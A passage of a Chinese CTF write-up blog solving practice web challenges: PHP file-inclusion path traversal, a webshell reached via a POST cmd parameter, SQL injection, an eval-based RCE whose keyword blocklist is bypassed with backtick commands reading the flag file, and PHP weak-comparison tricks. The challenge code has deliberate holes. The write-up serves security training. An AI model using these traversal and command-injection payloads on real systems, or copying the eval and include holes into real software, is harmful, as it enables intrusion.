class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>mb_strpo 函数返回首次出现问号的位置，也就是说如果我们自己在 file 参数中设置 '?'，就可以让 $_page 等于白名单中存在的那两个参数，比如这样：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?file=hint.php?</pre></td></tr></table></figure><p>现在我们就直接来到了这里</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>目前没啥思路，因为不知道 flag 在哪，那就看下 hint.php 中有什么吧：</p>\n<blockquote>\n<p>flag not here, and flag in ffffllllaaaagggg</p>\n</blockquote>\n<p>不出意外，在根目录直接目录穿越：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?file=hint.php?../../../../../../ffffllllaaaagggg</pre></td></tr></table></figure><p>这里？之所以不会造成影响，是因为？被视为 hint.php 文件名的一部分了，并不会影响 <code>include</code>  操作。</p>\n<p>说白了，就相当于多了个不存在的查询字符串</p>\n<p>通常情况下，查询字符串不应该直接放在 <code>include</code>  或 <code>require</code>  语句中，因为它们不是用于指定文件路径的标准方式，但查询字符串（query string）部分不会直接影响文件包含操作。</p>\n<h3 id=\"羊城杯-2020easycon\"><a class=\"anchor\" href=\"#羊城杯-2020easycon\">#</a> [羊城杯 2020] easycon</h3>\n<h4 id=\"rcecss信息收集\"><a class=\"anchor\" href=\"#rcecss信息收集\">#</a> RCE，css, 信息收集。</h4>\n<p>打开网页后，没发现什么有用的信息，用 dirsearch 扫一下，扫到文件 index.php。</p>\n<p>访问，弹出一个窗口告诉我们有个 POST 方式的 cmd 参数，直接用蚁剑连接。</p>\n<p>找了一圈没发现 flag，最有可能是 flag 的文件就是 bbbbbbb.txt 文件了。</p>\n<p>访问是一大串编码，有点像 base64 编码。</p>\n<p>解码，得到一个有着 JFIF 头的乱码，不出意外是个图片。</p>\n<p>可以建立一个 html 解码：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>index.html<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>keywords<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>keyword1,keyword2,keyword3<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>description<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>this is my page<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">&lt;!--   </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    data 表示取得数据的协定名称，image/png 是数据类型名称，base64 是数据的编码方法， </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    逗号后面是 image/png 文件 base64 编码后的数据.   </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    data:text/css;base64,base64 编码的 CSS 代码   </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    data:text/javascript,Javascript 代码   </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    data:text/javascript;base64,base64 编码的 Javascript 代码   </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    data:image/gif;base64,base64 编码的 gif 图片数据   </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    data:image/png;base64,base64 编码的 png 图片数据   </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    data:image/jpeg;base64,base64 编码的 jpeg 图片数据   </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    data:image/x-icon;base64,base64 编码的 icon 图片数据   </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>     --></span>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>data:image/jpeg;base64,编码位置<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>放在那个位置上直接打开即可。</p>\n<p>或者使用这个在线网站：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90cnk4LmNuL3Rvb2wvaW1hZ2UvYmFzZTY0\">https://try8.cn/tool/image/base64</span></p>\n<h3 id=\"litctf-2023这是什么sql-注一下\"><a class=\"anchor\" href=\"#litctf-2023这是什么sql-注一下\">#</a> [LitCTF 2023] 这是什么？SQL ！注一下</h3>\n<h4 id=\"sql注入php\"><a class=\"anchor\" href=\"#sql注入php\">#</a> SQL 注入，PHP</h4>\n<p>这道题目很显而易见，就是在 id 的周围加上了很多括号。</p>\n<p>绕过很容易，也不存在什么过滤啥的，就是很麻烦，用 SQLMAP 可以直接做出来</p>\n<p>手动注入可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmZXIudmlwL25vdGUvc2V0LzIxNjk=\">https://www.ctfer.vip/note/set/2169</span></p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/3.png\" alt=\"3\" /></p>\n<h3 id=\"uuctf-2022-新生赛ez_rce\"><a class=\"anchor\" href=\"#uuctf-2022-新生赛ez_rce\">#</a> [UUCTF 2022 新生赛] ez_rce</h3>\n<h4 id=\"rcewaf绕过\"><a class=\"anchor\" href=\"#rcewaf绕过\">#</a> RCE,WAF 绕过</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">## 放弃把，小伙子，你真的不会 RCE, 何必在此纠结呢？？？？？？？？？？？？</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'看看你输入的参数！！！不叫样子！！'</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"你想干什么？？？？？？？？？\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"居然都不输入参数，可恶!!!!!!!!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>发现过滤了很多函数，但是问题不大，完全可以使用反引号来代替 system 函数。</p>\n<p>不过得想个办法把结果显示出来，echo 被过滤，但我们还可以使用 print,var_dump.print_r 等。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?code=<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>`l\\s`<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>回显：</p>\n<blockquote>\n<p>error.log index.php</p>\n</blockquote>\n<p>看看根目录里有啥：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?code=<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>`l\\s /`<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到回显：</p>\n<blockquote>\n<p>bin boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p>\n</blockquote>\n<p>直接读取文件：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/?code=<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>`c\\at /fffffffffflagafag`<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到 flag:</p>\n<p This_IS_s0_easy_RCE=\"\">NSSCTF</p>\n<h2 id=\"2023921\"><a class=\"anchor\" href=\"#2023921\">#</a> 2023/9/21</h2>\n<h3 id=\"hnctf-2022-week1easy_html\"><a class=\"anchor\" href=\"#hnctf-2022-week1easy_html\">#</a> [HNCTF 2022 Week1]easy_html</h3>\n<h4 id=\"http协议js分析webhtml\"><a class=\"anchor\" href=\"#http协议js分析webhtml\">#</a> HTTP 协议，JS 分析，Web，html</h4>\n<p>进去后没啥有用信息，打开开发者工具，在响应包里看到一串暗示：</p>\n<blockquote>\n<p>Set-Cookie:</p>\n<p>flagisin=.%2Ff14g.php</p>\n</blockquote>\n<p>直接查看 /f14g.php</p>\n<p>进入一个网页，上面有个输入框，提示我们用手机号登录，那直接输手机号呗，不过得注意在 hackbar 中进行操作，因为题目得输入框限制最大时隔字符，而这道题只要输入十一个字符即获取到 flag。</p>\n<h3 id=\"gdouctf-2023受不了一点\"><a class=\"anchor\" href=\"#gdouctf-2023受不了一点\">#</a> [GDOUCTF 2023] 受不了一点</h3>\n<h4 id=\"php变量覆盖数组绕过php特性\"><a class=\"anchor\" href=\"#php变量覆盖数组绕过php特性\">#</a> PHP，变量覆盖，数组绕过，php 特性</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type:text/html;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gdou'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gdou'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'gdou'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>           <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cookie'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'j0k3r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>               <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bbb'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                  <span class=\"token variable\">$aaa</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'aaa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                  <span class=\"token variable\">$bbb</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bbb'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$aaa</span><span class=\"token operator\">==</span><span class=\"token number\">114514</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$bbb</span><span class=\"token operator\">==</span><span class=\"token number\">114514</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$aaa</span><span class=\"token operator\">!=</span><span class=\"token variable\">$bbb</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                   <span class=\"token variable\">$give</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'cancanwordflag'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                   <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'hacker!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                         <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$give</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'flag'</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                       <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                        <span class=\"token variable\">$$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                         <span class=\"token variable\">$$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                   <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"洗洗睡吧\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                 <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"行不行啊细狗\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'菜菜'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"就这?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"别来沾边\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这题目看着挺唬人的，其实简单的一批，说是要变量覆盖，其实没必要，因为 echo $flag; 没有什么限制条件，只要你不改他，foreach 是不会影响它的，具体的变量覆盖可以我的一口气做完 polar 靶场里面的题目。</p>\n<p>payload:</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">Get</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>aaa=114514&amp;bbb=114514a</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token property\">Post</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>gdou[]=1&amp;ctf[]=0</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token property\">Cookie</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>cookie=j0k3r</pre></td></tr></table></figure><p>这里 aaa 和 bbb 的绕过是因为，Get 传参时会把参数当做字符串处理，所以他两比较才不相等，又由于 php 中数组与字符串在进行弱类型比较时，会把字符串转换为数组，像 114514a 这种形式，会自动把最后的 a 给去掉，所以才会相等。</p>\n<h3 id=\"swpuctf-2022-新生赛ez_ez_phprevenge\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛ez_ez_phprevenge\">#</a> [SWPUCTF 2022 新生赛] ez_ez_php (revenge)</h3>\n<h4 id=\"php伪协议文件包含-3\"><a class=\"anchor\" href=\"#php伪协议文件包含-3\">#</a> PHP 伪协议，文件包含。</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token 